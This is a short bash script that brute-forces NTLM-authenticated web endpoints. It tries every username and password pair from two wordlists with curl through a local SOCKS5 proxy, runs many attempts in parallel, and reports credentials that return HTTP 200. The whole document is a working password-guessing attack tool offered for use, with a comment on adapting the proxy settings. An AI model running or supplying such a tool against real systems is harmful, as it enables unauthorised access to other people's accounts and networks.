#!/bin/bash
controlCurl(){
count=$(pidof curl | wc -w)
[ $count -ge 25 ] && controlCurl
}

echo Bruteforcing...
for uname in $(cat $1)
do
    for pass in $(cat $2)
        do
			controlCurl
			echo -ne "Current $uname:$pass\033[0K\r"
			# Adde or remove the proxy parameters according to your environment.
			curl -k --silent --ntlm -u $uname:$pass --socks5-hostname 127.0.0.1:1080 --write-out '%{http_code}' --output /dev/null $3 | grep -q '200' && echo -e "Valid creds found: $uname:$pass" &
		done

done
